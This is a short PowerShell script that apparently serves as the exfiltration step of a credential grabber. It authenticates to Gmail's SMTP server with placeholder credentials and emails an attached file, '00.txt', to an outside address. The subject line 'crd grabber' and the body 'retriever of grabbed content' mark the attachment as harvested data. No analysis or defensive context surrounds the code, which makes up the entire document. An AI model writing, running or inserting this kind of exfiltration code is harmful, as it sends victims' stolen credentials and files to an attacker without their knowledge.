$SmtpServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('sender@gmail.com', 'senderpass')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'sender@gmail.com'
$ReportEmail.To.Add('recipient@gmail.com')
$ReportEmail.Subject = 'crd grabber'
$ReportEmail.Body = 'retriever of grabbed content'
$ReportEmail.Attachments.Add('00.txt')
$SMTPInfo.Send($ReportEmail)
